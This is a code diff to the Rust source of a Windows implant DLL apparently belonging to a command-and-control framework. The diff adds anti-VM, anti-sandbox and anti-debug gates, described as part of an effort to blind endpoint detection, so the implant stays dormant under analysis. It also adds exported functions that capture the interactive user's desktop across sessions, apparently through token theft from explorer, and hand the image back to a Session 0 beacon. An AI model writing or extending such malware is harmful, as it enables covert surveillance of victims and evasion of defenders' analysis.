@@ -28,13 +28,33 @@ use crate::resolve::LiveNtdll;
 unsafe fn bootstrap() -> Option<LiveNtdll> {
     let ntdll = LiveNtdll::locate()?;
 
-    // Anti-debug / anti-sandbox: if the environment looks hostile (debugger
-    // attached, sandbox uptime too short), abort early — don't execute tasks
-    // under observation. Advisory only; configurable via the implant's sleep
-    // seconds (min_uptime is derived from the config blob).
-    //   min_uptime = 0 → never abort on uptime alone (configurable per build).
-    if crate::antidebug::looks_sandboxed(0) {
-        // Under a debugger or inside a sandbox → bail out.
+    // Anti-debug / anti-sandbox / anti-VM: if the environment looks hostile
+    // (VM detected, debugger attached, sandbox uptime too short), abort early
+    // — don't execute tasks under observation.
+    //
+    // envprobe (P0, EDR_BLINDNESS_UPGRADE_2026-07.md §2): the 5-check quiet
+    // suite. Runs BEFORE antidebug so the zero-API checks (CPUID/RDTSC) fire
+    // first with minimal behavioral noise. A positive VM/sandbox signal is
+    // the strongest gate — these have near-zero false-positive rates.
+    //
+    //   min_uptime = 600 (10 min): the previous `looks_sandboxed(0)` call
+    //   effectively DISABLED the uptime branch (uptime_secs() < 0 is never
+    //   true), leaving only BeingDebugged/ProcessDebugPort to gate. A real
+    //   interactive endpoint is usually minutes+ old; a freshly-spun sandbox
+    //   is seconds old. 600s is a conservative threshold that avoids tripping
+    //   on a slow-booting real host while catching the typical sandbox.
+    if matches!(
+        unsafe { crate::envprobe::looks_like_analysis_env() },
+        crate::envprobe::EnvVerdict::AnalysisEnv
+    ) {
+        // VM/sandbox detected → bail out. A production implant may instead
+        // drop to a dormant ultra-low-frequency cycle here to defeat
+        // behavior profiling; for now we treat it the same as a failed
+        // locate (the caller exits cleanly).
+        return None;
+    }
+    if crate::antidebug::looks_sandboxed(600) {
+        // Under a debugger or inside a fresh sandbox → bail out.
         // A production implant would set a flag; here we use the same early
         // return pattern as a failed locate (the caller spins, or exits).
         return None;
@@ -122,6 +142,107 @@ pub unsafe extern "system" fn nyx_beacon_oneshot() {
     if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
         let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
         f(code);
+    }
+    loop {
+        core::hint::spin_loop();
+    }
+}
+
+/// **Cross-session screenshot helper**: invoked by `CreateProcessAsUserW` inside
+/// the active interactive session (NOT Session 0). Captures the current desktop
+/// to `C:\Windows\Temp\nyx_shot.bmp` and exits. The Session 0 beacon waits for
+/// this process to finish, then reads the BMP back. No beacon loop, no
+/// check-in — pure file handoff. Invoke as
+/// `rundll32 nyx_implant_win.dll,nyx_screenshot_session`.
+#[no_mangle]
+pub unsafe extern "system" fn nyx_screenshot_session() {
+    let path = b"C:\\Windows\\Temp\\nyx_shot.bmp\0";
+    // Propagate capture success/failure into the exit code so the Session-0
+    // beacon can distinguish a helper that genuinely produced a BMP (exit 0)
+    // from one that failed to write (exit 1). The old code discarded the bool
+    // and always exited 0, so a failed capture looked identical to success.
+    let ok = crate::screenshot::capture_to_file(path);
+    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
+        let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
+        f(if ok { 0 } else { 1 });
+    }
+    loop {
+        core::hint::spin_loop();
+    }
+}
+
+/// Append `n` in decimal to `s` (no `u64::to_string` / `format!` in this crate).
+fn push_dec(s: &mut crate::heap::String, n: u64) {
+    if n == 0 {
+        s.push('0');
+        return;
+    }
+    let mut buf = [0u8; 20];
+    let mut i = buf.len();
+    let mut m = n;
+    while m > 0 {
+        i -= 1;
+        buf[i] = b'0' + (m % 10) as u8;
+        m /= 10;
+    }
+    for &b in &buf[i..] {
+        s.push(b as char);
+    }
+}
+
+/// **Screenshot cross-session test entry** (instrumented, for runtime validation
+/// without a full beacon+team-server round-trip). Runs `do_screenshot` and
+/// writes a tiny diagnostic log to `C:\Windows\Temp\nyx_shot_diag.txt`:
+///   - line 1: number of `Response` items produced (0 = total failure)
+///   - if an `Err` item is present, line 2 is the error string (this carries the
+///     `XSESS_FAIL` step code, e.g. "...failed (step 3: explorer token theft
+///     failed...)"). If a `FileChunk` is present, line 2 is "OK <total bytes>".
+/// Exits 0 on a successful capture, 1 otherwise. Invoke as
+/// `rundll32 nyx_implant_win.dll,nyx_screenshot_test`. NOT shipped in production
+/// builds — temporary instrumentation.
+#[no_mangle]
+pub unsafe extern "system" fn nyx_screenshot_test() {
+    let resp = crate::screenshot::do_screenshot(0);
+    // Tally: collect the FileChunk byte total or the first Err string.
+    let mut total_bytes: usize = 0;
+    let mut err_str: Option<&str> = None;
+    for r in &resp {
+        match r {
+            crate::screenshot::Response::FileChunk { data, .. } => {
+                total_bytes = total_bytes.saturating_add(data.len());
+            }
+            crate::screenshot::Response::Err(s) => {
+                if err_str.is_none() { err_str = Some(s.as_str()); }
+            }
+            _ => {}
+        }
+    }
+    // Write the diagnostic file via the same CreateFileW/WriteFile path the
+    // helper uses — keeps the test self-contained. Built with String::from +
+    // push_str (no `format!` macro in this no_std crate).
+    let line = if let Some(e) = err_str {
+        // step code is embedded in the error string itself
+        let mut s = crate::heap::String::from("1\n");
+        s.push_str(e);
+        s.push('\n');
+        s
+    } else if total_bytes > 0 {
+        let mut s = crate::heap::String::from("chunks=");
+        // decimal-encode resp.len() and total_bytes by hand (no format!/no u32::to_string)
+        push_dec(&mut s, resp.len() as u64);
+        s.push_str(" bytes=");
+        push_dec(&mut s, total_bytes as u64);
+        s.push_str("\nOK\n");
+        s
+    } else {
+        crate::heap::String::from("0\n(no response)\n")
+    };
+    let _ = crate::screenshot::capture_diag(b"C:\\Windows\\Temp\\nyx_shot_diag.txt\0", line.as_bytes());
+
+    let ok = err_str.is_none() && total_bytes > 0;
+    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
+        let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
+        f(if ok { 0 } else { 1 });
     }
     loop {
         core::hint::spin_loop();
